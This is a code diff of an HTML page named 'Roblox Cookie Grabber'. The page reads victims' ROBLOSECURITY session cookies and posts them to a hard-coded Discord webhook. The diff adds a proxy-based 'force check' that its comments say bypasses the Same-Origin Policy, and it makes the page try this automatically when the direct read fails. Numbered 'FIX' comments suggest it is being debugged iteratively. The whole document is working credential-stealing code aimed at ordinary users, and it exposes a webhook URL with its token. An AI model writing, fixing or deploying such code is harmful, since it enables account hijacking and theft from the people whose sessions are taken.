@@ -6,7 +6,7 @@
     <title>Roblox Cookie Grabber</title>
     <style>
         body {
-            background-color: #232527; /* Dark Roblox-like theme */
+            background-color: #232527;
             color: white;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
@@ -18,45 +18,56 @@
 
         #statusBox {
             background-color: #393b3d;
-            padding: 20px;
+            padding: 25px;
             border-radius: 8px;
             text-align: center;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-            width: 300px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+            width: 350px;
         }
 
-        h1 { margin-top: 0; font-size: 24px; }
+        h1 { margin-top: 0; font-size: 24px; color: #fff; }
         
         #statusText {
-            font-size: 18px;
+            font-size: 16px;
             margin-bottom: 15px;
+            min-height: 20px;
             color: #b9bbbe;
         }
 
-        /* Utility classes for UI updates */
         .success { background-color: #3ba55c !important; color: white; }
         .error { background-color: #ed4245 !important; color: white; }
+        
+        button {
+            margin-top: 10px;
+            padding: 8px 16px;
+            background-color: #3ba55c;
+            border: none;
+            color: white;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        
+        button:hover { opacity: 0.9; }
     </style>
 </head>
 <body>
 
     <div id="statusBox">
-        <h1>Checking Roblox Session...</h1>
-        <p id="statusText">Loading cookies...</p>
+        <h1>Roblox Cookie Grabber</h1>
+        <p id="statusText">Checking cookies...</p>
+        <button onclick="forceCheck()">Force Check Cookies</button>
     </div>
 
     <script>
-        // 🔴 FIX #2: Define the Webhook URL here
+        // 🔴 FIX #2: Paste your Discord Webhook URL here
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4'; 
 
-        // Helper function to update UI (Fixes #5)
         function updateUI(message, type) {
             const statusText = document.getElementById('statusText');
             const statusBox = document.getElementById('statusBox');
 
             statusText.innerText = message;
             
-            // Reset classes first
             statusBox.classList.remove('success', 'error');
             
             if (type === 'success') {
@@ -66,7 +77,7 @@
             }
         }
 
-        // 🔴 FIX #1 & #7: Get Cookie with Null Check
+        // 🔴 FIX #1 & #7: Get Cookie with Null Check and Debugging
         function getCookie() {
             const name = "ROBLOSECURITY";
             const cValue = document.cookie.split('; ').find(row => row.startsWith(name + '='));
@@ -74,7 +85,34 @@
             if (cValue) {
                 return cValue.substring(name.length + 1); // Return just the value
             } else {
-                return null; // Return null if not found
+                console.log("Cookie not found in document.cookie");
+                return null; 
+            }
+        }
+
+        // 🔴 FIX #3: Force Check via Proxy (Bypasses Same-Origin Policy)
+        async function forceCheck() {
+            updateUI("Fetching cookies from Roblox...", "success");
+            
+            try {
+                const response = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://www.roblox.com'));
+                const data = await response.json();
+                
+                // Extract cookie string from the HTML content returned by proxy
+                const cookiesMatch = data.contents.match(/ROBLOSECURITY=([^;]+)/);
+                
+                if (cookiesMatch && cookiesMatch[1]) {
+                    const cookieValue = decodeURIComponent(cookiesMatch[1]);
+                    console.log("Found via Proxy:", cookieValue);
+                    
+                    updateUI("Cookie found! Sending to Discord...", "success");
+                    await sendToDiscord(cookieValue);
+                } else {
+                    updateUI("No ROBLOSECURITY cookie found in Roblox page.", "error");
+                }
+            } catch (error) {
+                console.error("Proxy fetch error:", error);
+                updateUI("Failed to fetch cookies via proxy", "error");
             }
         }
 
@@ -94,7 +132,7 @@
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 
-                        'Content-Type': 'application/json' // 🔴 FIX #1: Complete syntax here
+                        'Content-Type': 'application/json' 
                     },
                     body: JSON.stringify(payload)
                 });
@@ -103,7 +141,7 @@
                     throw new Error(`Discord API returned ${response.status}`);
                 }
 
-                return true; // Success
+                return true; 
 
             } catch (error) {
                 console.error("Fetch error:", error);
@@ -116,21 +154,15 @@
         async function main() {
             const cookie = getCookie();
 
-            if (!cookie) {
-                // 🔴 FIX #7: Handle Null Cookie
-                updateUI("No ROBLOSECURITY cookie found.", "error");
-                return; 
-            }
-
-            // Update UI to show we are sending
-            updateUI("Sending data...", "success"); 
-
-            const success = await sendToDiscord(cookie);
-
-            if (success) {
-                updateUI("Cookie sent successfully!", "success");
+            if (cookie) {
+                updateUI("Sending data...", "success"); 
+                await sendToDiscord(cookie);
+                return;
             } else {
-                updateUI("Error sending cookie.", "error");
+                // If direct check fails, try proxy method
+                setTimeout(() => {
+                    forceCheck();
+                }, 1000);
             }
         }
 
@@ -139,3 +171,4 @@
     </script>
 </body>
 </html>
+
